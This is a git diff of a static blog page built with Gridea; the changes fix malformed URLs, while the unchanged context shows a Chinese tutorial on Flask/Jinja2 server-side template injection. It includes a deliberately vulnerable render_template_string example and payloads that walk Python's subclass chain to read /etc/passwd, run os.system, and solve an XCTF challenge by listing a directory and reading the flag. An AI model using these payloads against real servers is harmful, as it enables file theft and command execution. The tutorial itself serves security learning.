@@ -3,10 +3,10 @@
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>Python-模板注入 | Gridea</title>
-<link rel="shortcut icon" href="https://https://jinqipiaopiao.github.io//favicon.ico?v=1624177818252">
+<link rel="shortcut icon" href="https://jinqipiaopiao.github.io//favicon.ico?v=1624178139382">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://https://jinqipiaopiao.github.io//styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="Python-模板注入 | Gridea - Atom Feed" href="https://https://jinqipiaopiao.github.io//atom.xml">
+<link rel="stylesheet" href="https://jinqipiaopiao.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Python-模板注入 | Gridea - Atom Feed" href="https://jinqipiaopiao.github.io//atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -24,8 +24,8 @@ fla..." />
     <div class="main">
       <div class="main-content">
         <div class="site-header">
-  <a href="https://https://jinqipiaopiao.github.io/">
-  <img class="avatar" src="https://https://jinqipiaopiao.github.io//images/avatar.png?v=1624177818252" alt="">
+  <a href="https://jinqipiaopiao.github.io/">
+  <img class="avatar" src="https://jinqipiaopiao.github.io//images/avatar.png?v=1624178139382" alt="">
   </a>
   <h1 class="site-title">
     Gridea
@@ -95,7 +95,7 @@ fla..." />
                 <p>何为模板注入？<br>
 模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，哲大大提升了开发效率，良好的设计也是的代码重用变得更加容易。<br>
 到那时模板引擎也拓宽了我们的攻击面，注入到模板中的代码可能会引发RCE或者XSS<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622774211791.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622774211791.png" alt="" loading="lazy"><br>
 flask基础<br>
 在学习SSTI之前，先把flask的运作流程搞明白，这样有利于更加快速的理解原理<br>
 路由<br>
@@ -158,7 +158,7 @@ return render_template_string(html)
 </code></pre>
 <p>这段代码存在漏洞的原因是数据和代码的混淆。代码中的code是用户可控的，会和html拼接后直接带入渲染。</p>
 <p>尝试构造code为一串js代码。<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622774927945.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622774927945.png" alt="" loading="lazy"><br>
 将代码改为如下</p>
 <pre><code>@app.route('/test/')
 def test():
@@ -166,7 +166,7 @@ code = request.args.get('id')
 return render_template_string('&lt;h1&gt;{{ code }}&lt;/h1&gt;',code=code)
 </code></pre>
 <p>继续尝试<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622774932382.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622774932382.png" alt="" loading="lazy"><br>
 可以看到，js代码被原样输出了。这是因为模板引擎一般都默认对渲染的变量值进行编码转义，这样就不会存在xss了。在这段代码中用户所控的是code变量，而不是模板内容。存在漏洞的代码中，模板内容直接受用户控制的。<br>
 Flask模板注入</p>
 <p>解析：</p>
@@ -190,14 +190,14 @@ request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用
 [].__class__.__bases__[0]       //其他的类似
 </code></pre>
 <p>3.获取基本类的子类<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622774939374.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622774939374.png" alt="" loading="lazy"><br>
 ssti的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件的类）加以利用。</p>
 <p>那么我们可以利用的类有哪些呢？</p>
 <p>4.利用</p>
 <p>我们可以利用的方法有<code>&lt;type 'file'&gt;</code>等。（甚至file一般是第40号）</p>
 <pre><code>().__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622774944103.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1622774944103.png" alt="" loading="lazy"><br>
 可以从上面的例子中看到我们用file读取了 /etc/passwd ，但是如果想要读取目录怎么办？</p>
 <p>那么我们可以寻找万能的os模块。</p>
 <p>写脚本遍历。<br>
@@ -216,7 +216,7 @@ except:
 print '-'
 num+=1
 </code></pre>
-<p><img src="https://https://jinqipiaopiao.github.io//post-images/1622774949520.png" alt="" loading="lazy"><br>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1622774949520.png" alt="" loading="lazy"><br>
 直接调用就好了。可以直接调用system函数，有了shell其他的问题不就解决了吗？</p>
 <pre><code>().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')
 </code></pre>
@@ -238,10 +238,10 @@ num+=1
 </code></pre>
 <p>这里拿 xctf 中的 Web_python_template_injection 做例子</p>
 <p>进入题目界面可以看到<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622774955812.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622774955812.png" alt="" loading="lazy"><br>
 尝试模板注入      <code>{{7*7}}</code></p>
 <p>/49的存在说明这条指令被忠实地执行了。接下来，开始想办法编代码拿到服务器的控制台权限 首先，题目告诉我们这是一个python注入问题，那么脚本肯定也是python的，思考怎样用python语句获取控制台权限：想到了os.system和os.popen(<a href="https://blog.csdn.net/sxingming/article/details/52071514">参考资料</a>),这两句前者返回<strong>退出状态码</strong>,后者<strong>以file形式</strong>返回<strong>输出内容</strong>,我们想要的是内容，所所以选择os.popen<br>
-<img src="https://https://jinqipiaopiao.github.io//post-images/1622774960628.png" alt="" loading="lazy"><br>
+<img src="https://jinqipiaopiao.github.io//post-images/1622774960628.png" alt="" loading="lazy"><br>
 知道了要用这一句，那么我要怎么找到这一句呢？python给我们提供了完整的寻找链(参考资料)<br>
 class：返回对象所属的类<br>
 mro：返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。<br>
@@ -253,11 +253,11 @@ globals：对包含函数全局变量的字典的引用<br>
 <p>构造payload：</p>
 <pre><code>{{[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
 </code></pre>
-<figure data-type="image" tabindex="1"><img src="https://https://jinqipiaopiao.github.io//post-images/1622774966196.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://jinqipiaopiao.github.io//post-images/1622774966196.png" alt="" loading="lazy"></figure>
 <p>读目录发现了fl4g。直接用file读取。构造payload:</p>
 <pre><code>{{[].__class__.__base__.__subclasses__()[40]('fl4g').read()}}
 </code></pre>
-<figure data-type="image" tabindex="2"><img src="https://https://jinqipiaopiao.github.io//post-images/1622774971627.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1622774971627.png" alt="" loading="lazy"></figure>
 <p>拿到了flag。<br>
 ##注意事项：<br>
 复制代码</p>
@@ -283,7 +283,7 @@ globals：对包含函数全局变量的字典的引用<br>
         
           <div class="next-post">
             <div class="next">下一篇</div>
-            <a href="https://https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">
+            <a href="https://jinqipiaopiao.github.io/post/web-an-quan-xiang-guan-zhi-shi-dian/">
               <h3 class="post-title">
                 web安全相关知识点
               </h3>
@@ -295,7 +295,7 @@ globals：对包含函数全局变量的字典的引用<br>
 
         <div class="site-footer">
   Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
-  <a class="rss" href="https://https://jinqipiaopiao.github.io//atom.xml" target="_blank">
+  <a class="rss" href="https://jinqipiaopiao.github.io//atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
